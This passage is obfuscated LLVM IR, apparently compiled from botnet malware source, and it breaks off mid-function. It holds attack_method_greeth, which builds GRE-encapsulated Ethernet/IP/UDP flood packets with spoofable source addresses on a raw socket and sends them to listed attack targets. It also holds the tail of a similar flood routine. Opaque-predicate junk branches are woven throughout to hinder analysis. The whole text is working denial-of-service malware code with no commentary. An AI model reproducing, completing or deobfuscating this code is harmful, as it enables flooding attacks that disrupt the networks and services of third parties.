  %858 = sext i32 %857 to i64
  %859 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %856, i64 %858
  %860 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %859, i32 0, i32 0
  %861 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %860, i32 0, i32 0
  store i16 2, i16* %861, align 4
  %862 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %863 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %862, i32 0, i32 9
  %864 = load i32, i32* %863, align 4
  %865 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %866 = load i32, i32* %17, align 4
  %867 = sext i32 %866 to i64
  %868 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %865, i64 %867
  %869 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %868, i32 0, i32 0
  %870 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %869, i32 0, i32 2
  %871 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %870, i32 0, i32 0
  store i32 %864, i32* %871, align 4
  %872 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %873 = load i32, i32* %17, align 4
  %874 = sext i32 %873 to i64
  %875 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %872, i64 %874
  %876 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %875, i32 0, i32 0
  %877 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %876, i32 0, i32 1
  store i16 0, i16* %877, align 2
  %878 = load i32, i32* %18, align 4
  %879 = load i8*, i8** %34, align 8
  %880 = load i32, i32* %26, align 4
  %881 = sext i32 %880 to i64
  %_106 = sub i64 0, 52
  %gen107 = add i64 %_106, %881
  %_108 = sub i64 52, %881
  %gen109 = mul i64 %_108, %881
  %_110 = sub i64 0, 52
  %gen111 = add i64 %_110, %881
  %_112 = sub i64 0, 52
  %gen113 = add i64 %_112, %881
  %_114 = sub i64 52, %881
  %gen115 = mul i64 %_114, %881
  %882 = add i64 52, %881
  %883 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %884 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %885 = load i32, i32* %17, align 4
  %886 = sext i32 %885 to i64
  %887 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %884, i64 %886
  %888 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %887, i32 0, i32 0
  %889 = bitcast %struct.sockaddr_in* %888 to %struct.sockaddr*
  store %struct.sockaddr* %889, %struct.sockaddr** %883, align 8
  %890 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %891 = load %struct.sockaddr*, %struct.sockaddr** %890, align 8
  %892 = call i64 @sendto(i32 %878, i8* %879, i64 %882, i32 16384, %struct.sockaddr* %891, i32 16)
  br label %originalBB98

originalBB119alteredBB:                           ; preds = %originalBB119, %637
  %893 = load i32, i32* %17, align 4
  %_120 = sub i32 0, %893
  %gen121 = add i32 %_120, 1
  %_122 = sub i32 0, %893
  %gen123 = add i32 %_122, 1
  %_124 = sub i32 0, %893
  %gen125 = add i32 %_124, 1
  %_126 = shl i32 %893, 1
  %_127 = sub i32 0, %893
  %gen128 = add i32 %_127, 1
  %_129 = sub i32 0, %893
  %gen130 = add i32 %_129, 1
  %894 = add nsw i32 %893, 1
  store i32 %894, i32* %17, align 4
  br label %originalBB119
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare i32 @close(i32) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greeth(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = load i32, i32* @x.21
  %6 = load i32, i32* @y.22
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8, align 1
  %14 = alloca %struct.attack_target*, align 8
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_option*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8**, align 8
  %20 = alloca i8, align 1
  %21 = alloca i16, align 2
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i16, align 2
  %25 = alloca i16, align 2
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i8, align 1
  %29 = alloca i32, align 4
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca %struct.ethhdr*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.udphdr*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca i8*, align 8
  %39 = alloca %struct.iphdr*, align 8
  %40 = alloca %struct.grehdr*, align 8
  %41 = alloca %struct.ethhdr*, align 8
  %42 = alloca %struct.iphdr*, align 8
  %43 = alloca %struct.udphdr*, align 8
  %44 = alloca i8*, align 8
  %45 = alloca i32, align 4
  %46 = alloca i32, align 4
  %47 = alloca i32, align 4
  %48 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %13, align 1
  store %struct.attack_target* %1, %struct.attack_target** %14, align 8
  store i8 %2, i8* %15, align 1
  store %struct.attack_option* %3, %struct.attack_option** %16, align 8
  %49 = load i8, i8* %13, align 1
  %50 = zext i8 %49 to i64
  %51 = call noalias i8* @calloc(i64 %50, i64 8) #6
  %52 = bitcast i8* %51 to i8**
  store i8** %52, i8*** %19, align 8
  %53 = load i8, i8* %15, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 2, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %20, align 1
  %57 = load i8, i8* %15, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 3, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %21, align 2
  %61 = load i8, i8* %15, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 4, i32 64)
  %64 = trunc i32 %63 to i8
  store i8 %64, i8* %22, align 1
  %65 = load i8, i8* %15, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 5, i32 1)
  %68 = trunc i32 %67 to i8
  store i8 %68, i8* %23, align 1
  %69 = load i8, i8* %15, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 6, i32 65535)
  %72 = trunc i32 %71 to i16
  store i16 %72, i16* %24, align 2
  %73 = load i8, i8* %15, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %75 = call i32 @attack_get_opt_int(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 7, i32 65535)
  %76 = trunc i32 %75 to i16
  store i16 %76, i16* %25, align 2
  %77 = load i8, i8* %15, align 1
  %78 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %79 = call i32 @attack_get_opt_int(i8 zeroext %77, %struct.attack_option* %78, i8 zeroext 0, i32 512)
  store i32 %79, i32* %26, align 4
  %80 = load i8, i8* %15, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 1, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %27, align 1
  %84 = load i8, i8* %15, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 19, i32 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %28, align 1
  %88 = load i8, i8* %15, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %90 = load i32, i32* @LOCAL_ADDR, align 4
  %91 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 25, i32 %90)
  store i32 %91, i32* %29, align 4
  %92 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %92, i32* %18, align 4
  %93 = icmp eq i32 %92, -1
  %94 = load i32, i32* @x.21
  %95 = load i32, i32* @y.22
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %93, label %102, label %103

; <label>:102:                                    ; preds = %originalBBpart2
  br label %744

; <label>:103:                                    ; preds = %originalBBpart2
  store i32 1, i32* %17, align 4
  %104 = load i32, i32* %18, align 4
  %105 = bitcast i32* %17 to i8*
  %106 = call i32 @setsockopt(i32 %104, i32 0, i32 3, i8* %105, i32 4) #6
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %127

; <label>:108:                                    ; preds = %103
  %109 = load i32, i32* @x.21
  %110 = load i32, i32* @y.22
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %108
  %117 = load i32, i32* %18, align 4
  %118 = call i32 @close(i32 %117)
  %119 = load i32, i32* @x.21
  %120 = load i32, i32* @y.22
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %744

; <label>:127:                                    ; preds = %103
  store i32 0, i32* %17, align 4
  br label %128

; <label>:128:                                    ; preds = %originalBBpart295, %127
  %129 = load i32, i32* %17, align 4
  %130 = load i8, i8* %13, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp slt i32 %129, %131
  br i1 %132, label %133, label %351

; <label>:133:                                    ; preds = %128
  %134 = load i32, i32* @x.21
  %135 = load i32, i32* @y.22
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %133
  %142 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %143 = load i8**, i8*** %19, align 8
  %144 = load i32, i32* %17, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds i8*, i8** %143, i64 %145
  store i8* %142, i8** %146, align 8
  %147 = load i8**, i8*** %19, align 8
  %148 = load i32, i32* %17, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds i8*, i8** %147, i64 %149
  %151 = load i8*, i8** %150, align 8
  %152 = bitcast i8* %151 to %struct.iphdr*
  store %struct.iphdr* %152, %struct.iphdr** %30, align 8
  %153 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i64 1
  %155 = bitcast %struct.iphdr* %154 to %struct.grehdr*
  store %struct.grehdr* %155, %struct.grehdr** %31, align 8
  %156 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %157 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %156, i64 1
  %158 = bitcast %struct.grehdr* %157 to %struct.ethhdr*
  store %struct.ethhdr* %158, %struct.ethhdr** %32, align 8
  %159 = load %struct.ethhdr*, %struct.ethhdr** %32, align 8
  %160 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %159, i64 1
  %161 = bitcast %struct.ethhdr* %160 to %struct.iphdr*
  store %struct.iphdr* %161, %struct.iphdr** %33, align 8
  %162 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i64 1
  %164 = bitcast %struct.iphdr* %163 to %struct.udphdr*
  store %struct.udphdr* %164, %struct.udphdr** %34, align 8
  %165 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %166 = bitcast %struct.iphdr* %165 to i8*
  %167 = load i8, i8* %166, align 4
  %168 = and i8 %167, 15
  %169 = or i8 %168, 64
  store i8 %169, i8* %166, align 4
  %170 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %171 = bitcast %struct.iphdr* %170 to i8*
  %172 = load i8, i8* %171, align 4
  %173 = and i8 %172, -16
  %174 = or i8 %173, 5
  store i8 %174, i8* %171, align 4
  %175 = load i8, i8* %20, align 1
  %176 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 1
  store i8 %175, i8* %177, align 1
  %178 = load i32, i32* %26, align 4
  %179 = sext i32 %178 to i64
  %180 = add i64 66, %179
  %181 = trunc i64 %180 to i16
  %182 = call zeroext i16 @htons(i16 zeroext %181) #7
  %183 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i32 0, i32 2
  store i16 %182, i16* %184, align 2
  %185 = load i16, i16* %21, align 2
  %186 = call zeroext i16 @htons(i16 zeroext %185) #7
  %187 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %188 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %187, i32 0, i32 3
  store i16 %186, i16* %188, align 4
  %189 = load i8, i8* %22, align 1
  %190 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 5
  store i8 %189, i8* %191, align 4
  %192 = load i8, i8* %23, align 1
  %193 = icmp ne i8 %192, 0
  %194 = load i32, i32* @x.21
  %195 = load i32, i32* @y.22
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBBpart241, label %originalBB6alteredBB

originalBBpart241:                                ; preds = %originalBB6
  br i1 %193, label %202, label %206

; <label>:202:                                    ; preds = %originalBBpart241
  %203 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %204 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 4
  store i16 %203, i16* %205, align 2
  br label %206

; <label>:206:                                    ; preds = %202, %originalBBpart241
  %207 = load i32, i32* @x.21
  %208 = load i32, i32* @y.22
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %206
  %215 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 6
  store i8 47, i8* %216, align 1
  %217 = load i32, i32* %29, align 4
  %218 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 8
  store i32 %217, i32* %219, align 4
  %220 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %221 = load i32, i32* %17, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %220, i64 %222
  %224 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %223, i32 0, i32 1
  %225 = load i32, i32* %224, align 4
  %226 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 9
  store i32 %225, i32* %227, align 4
  %228 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %229 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %230 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %229, i32 0, i32 1
  store i16 %228, i16* %230, align 2
  %231 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %232 = load %struct.ethhdr*, %struct.ethhdr** %32, align 8
  %233 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %232, i32 0, i32 2
  store i16 %231, i16* %233, align 1
  %234 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %235 = bitcast %struct.iphdr* %234 to i8*
  %236 = load i8, i8* %235, align 4
  %237 = and i8 %236, 15
  %238 = or i8 %237, 64
  store i8 %238, i8* %235, align 4
  %239 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %240 = bitcast %struct.iphdr* %239 to i8*
  %241 = load i8, i8* %240, align 4
  %242 = and i8 %241, -16
  %243 = or i8 %242, 5
  store i8 %243, i8* %240, align 4
  %244 = load i8, i8* %20, align 1
  %245 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %246 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %245, i32 0, i32 1
  store i8 %244, i8* %246, align 1
  %247 = load i32, i32* %26, align 4
  %248 = sext i32 %247 to i64
  %249 = add i64 28, %248
  %250 = trunc i64 %249 to i16
  %251 = call zeroext i16 @htons(i16 zeroext %250) #7
  %252 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 2
  store i16 %251, i16* %253, align 2
  %254 = load i16, i16* %21, align 2
  %255 = zext i16 %254 to i32
  %256 = xor i32 %255, -1
  %257 = trunc i32 %256 to i16
  %258 = call zeroext i16 @htons(i16 zeroext %257) #7
  %259 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %260 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %259, i32 0, i32 3
  store i16 %258, i16* %260, align 4
  %261 = load i8, i8* %22, align 1
  %262 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %263 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %262, i32 0, i32 5
  store i8 %261, i8* %263, align 4
  %264 = load i8, i8* %23, align 1
  %265 = icmp ne i8 %264, 0
  %266 = load i32, i32* @x.21
  %267 = load i32, i32* @y.22
  %268 = sub i32 %266, 1
  %269 = mul i32 %266, %268
  %270 = urem i32 %269, 2
  %271 = icmp eq i32 %270, 0
  %272 = icmp slt i32 %267, 10
  %273 = or i1 %271, %272
  br i1 %273, label %originalBBpart279, label %originalBB43alteredBB

originalBBpart279:                                ; preds = %originalBB43
  br i1 %265, label %274, label %294

; <label>:274:                                    ; preds = %originalBBpart279
  %275 = load i32, i32* @x.21
  %276 = load i32, i32* @y.22
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBB81, label %originalBB81alteredBB

originalBB81:                                     ; preds = %originalBB81alteredBB, %274
  %283 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %284 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %285 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %284, i32 0, i32 4
  store i16 %283, i16* %285, align 2
  %286 = load i32, i32* @x.21
  %287 = load i32, i32* @y.22
  %288 = sub i32 %286, 1
  %289 = mul i32 %286, %288
  %290 = urem i32 %289, 2
  %291 = icmp eq i32 %290, 0
  %292 = icmp slt i32 %287, 10
  %293 = or i1 %291, %292
  br i1 %293, label %originalBBpart283, label %originalBB81alteredBB

originalBBpart283:                                ; preds = %originalBB81
  br label %294

; <label>:294:                                    ; preds = %originalBBpart283, %originalBBpart279
  %295 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %296 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %295, i32 0, i32 6
  store i8 17, i8* %296, align 1
  %297 = call i32 @rand_next()
  %298 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %299 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %298, i32 0, i32 8
  store i32 %297, i32* %299, align 4
  %300 = load i8, i8* %28, align 1
  %301 = icmp ne i8 %300, 0
  br i1 %301, label %302, label %308

; <label>:302:                                    ; preds = %294
  %303 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %304 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %303, i32 0, i32 9
  %305 = load i32, i32* %304, align 4
  %306 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %307 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %306, i32 0, i32 9
  store i32 %305, i32* %307, align 4
  br label %316

; <label>:308:                                    ; preds = %294
  %309 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %310 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %309, i32 0, i32 8
  %311 = load i32, i32* %310, align 4
  %312 = sub i32 %311, 1024
  %313 = xor i32 %312, -1
  %314 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %315 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %314, i32 0, i32 9
  store i32 %313, i32* %315, align 4
  br label %316

; <label>:316:                                    ; preds = %308, %302
  %317 = load i16, i16* %24, align 2
  %318 = call zeroext i16 @htons(i16 zeroext %317) #7
  %319 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %320 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %319, i32 0, i32 0
  store i16 %318, i16* %320, align 2
  %321 = load i16, i16* %25, align 2
  %322 = call zeroext i16 @htons(i16 zeroext %321) #7
  %323 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %324 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %323, i32 0, i32 1
  store i16 %322, i16* %324, align 2
  %325 = load i32, i32* %26, align 4
  %326 = sext i32 %325 to i64
  %327 = add i64 8, %326
  %328 = trunc i64 %327 to i16
  %329 = call zeroext i16 @htons(i16 zeroext %328) #7
  %330 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %331 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %330, i32 0, i32 2
  store i16 %329, i16* %331, align 2
  br label %332

; <label>:332:                                    ; preds = %316
  %333 = load i32, i32* @x.21
  %334 = load i32, i32* @y.22
  %335 = sub i32 %333, 1
  %336 = mul i32 %333, %335
  %337 = urem i32 %336, 2
  %338 = icmp eq i32 %337, 0
  %339 = icmp slt i32 %334, 10
  %340 = or i1 %338, %339
  br i1 %340, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %332
  %341 = load i32, i32* %17, align 4
  %342 = add nsw i32 %341, 1
  store i32 %342, i32* %17, align 4
  %343 = load i32, i32* @x.21
  %344 = load i32, i32* @y.22
  %345 = sub i32 %343, 1
  %346 = mul i32 %343, %345
  %347 = urem i32 %346, 2
  %348 = icmp eq i32 %347, 0
  %349 = icmp slt i32 %344, 10
  %350 = or i1 %348, %349
  br i1 %350, label %originalBBpart295, label %originalBB85alteredBB

originalBBpart295:                                ; preds = %originalBB85
  br label %128

; <label>:351:                                    ; preds = %128
  br label %352

; <label>:352:                                    ; preds = %743, %351
  %353 = load i32, i32* @x.21
  %354 = load i32, i32* @y.22
  %355 = sub i32 %353, 1
  %356 = mul i32 %353, %355
  %357 = urem i32 %356, 2
  %358 = icmp eq i32 %357, 0
  %359 = icmp slt i32 %354, 10
  %360 = or i1 %358, %359
  br i1 %360, label %originalBB97, label %originalBB97alteredBB

originalBB97:                                     ; preds = %originalBB97alteredBB, %352
  store i32 0, i32* %17, align 4
  %361 = load i32, i32* @x.21
  %362 = load i32, i32* @y.22
  %363 = sub i32 %361, 1
  %364 = mul i32 %361, %363
  %365 = urem i32 %364, 2
  %366 = icmp eq i32 %365, 0
  %367 = icmp slt i32 %362, 10
  %368 = or i1 %366, %367
  br i1 %368, label %originalBBpart299, label %originalBB97alteredBB

originalBBpart299:                                ; preds = %originalBB97
  br label %369

; <label>:369:                                    ; preds = %originalBBpart2175, %originalBBpart299
  %370 = load i32, i32* %17, align 4
  %371 = load i8, i8* %13, align 1
  %372 = zext i8 %371 to i32
  %373 = icmp slt i32 %370, %372
  br i1 %373, label %374, label %743

; <label>:374:                                    ; preds = %369
  %375 = load i8**, i8*** %19, align 8
  %376 = load i32, i32* %17, align 4
  %377 = sext i32 %376 to i64
  %378 = getelementptr inbounds i8*, i8** %375, i64 %377
  %379 = load i8*, i8** %378, align 8
  store i8* %379, i8** %38, align 8
  %380 = load i8*, i8** %38, align 8
  %381 = bitcast i8* %380 to %struct.iphdr*
  store %struct.iphdr* %381, %struct.iphdr** %39, align 8
  %382 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %383 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %382, i64 1
  %384 = bitcast %struct.iphdr* %383 to %struct.grehdr*
  store %struct.grehdr* %384, %struct.grehdr** %40, align 8
  %385 = load %struct.grehdr*, %struct.grehdr** %40, align 8
  %386 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %385, i64 1
  %387 = bitcast %struct.grehdr* %386 to %struct.ethhdr*
  store %struct.ethhdr* %387, %struct.ethhdr** %41, align 8
  %388 = load %struct.ethhdr*, %struct.ethhdr** %41, align 8
  %389 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %388, i64 1
  %390 = bitcast %struct.ethhdr* %389 to %struct.iphdr*
  store %struct.iphdr* %390, %struct.iphdr** %42, align 8
  %391 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %392 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %391, i64 1
  %393 = bitcast %struct.iphdr* %392 to %struct.udphdr*
  store %struct.udphdr* %393, %struct.udphdr** %43, align 8
  %394 = load %struct.udphdr*, %struct.udphdr** %43, align 8
  %395 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %394, i64 1
  %396 = bitcast %struct.udphdr* %395 to i8*
  store i8* %396, i8** %44, align 8
  %397 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %398 = load i32, i32* %17, align 4
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %397, i64 %399
  %401 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %400, i32 0, i32 2
  %402 = load i8, i8* %401, align 4
  %403 = zext i8 %402 to i32
  %404 = icmp slt i32 %403, 32
  br i1 %404, label %405, label %442

; <label>:405:                                    ; preds = %374
  %406 = load i32, i32* @x.21
  %407 = load i32, i32* @y.22
  %408 = sub i32 %406, 1
  %409 = mul i32 %406, %408
  %410 = urem i32 %409, 2
  %411 = icmp eq i32 %410, 0
  %412 = icmp slt i32 %407, 10
  %413 = or i1 %411, %412
  br i1 %413, label %originalBB101, label %originalBB101alteredBB

originalBB101:                                    ; preds = %originalBB101alteredBB, %405
  %414 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %415 = load i32, i32* %17, align 4
  %416 = sext i32 %415 to i64
  %417 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %414, i64 %416
  %418 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %417, i32 0, i32 1
  %419 = load i32, i32* %418, align 4
  %420 = call i32 @ntohl(i32 %419) #7
  %421 = call i32 @rand_next()
  %422 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %423 = load i32, i32* %17, align 4
  %424 = sext i32 %423 to i64
  %425 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %422, i64 %424
  %426 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %425, i32 0, i32 2
  %427 = load i8, i8* %426, align 4
  %428 = zext i8 %427 to i32
  %429 = lshr i32 %421, %428
  %430 = add i32 %420, %429
  %431 = call i32 @htonl(i32 %430) #7
  %432 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %433 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %432, i32 0, i32 9
  store i32 %431, i32* %433, align 4
  %434 = load i32, i32* @x.21
  %435 = load i32, i32* @y.22
  %436 = sub i32 %434, 1
  %437 = mul i32 %434, %436
  %438 = urem i32 %437, 2
  %439 = icmp eq i32 %438, 0
  %440 = icmp slt i32 %435, 10
  %441 = or i1 %439, %440
  br i1 %441, label %originalBBpart2112, label %originalBB101alteredBB

originalBBpart2112:                               ; preds = %originalBB101
  br label %442

; <label>:442:                                    ; preds = %originalBBpart2112, %374
  %443 = load i32, i32* @x.21
  %444 = load i32, i32* @y.22
  %445 = sub i32 %443, 1
  %446 = mul i32 %443, %445
  %447 = urem i32 %446, 2
  %448 = icmp eq i32 %447, 0
  %449 = icmp slt i32 %444, 10
  %450 = or i1 %448, %449
  br i1 %450, label %originalBB114, label %originalBB114alteredBB

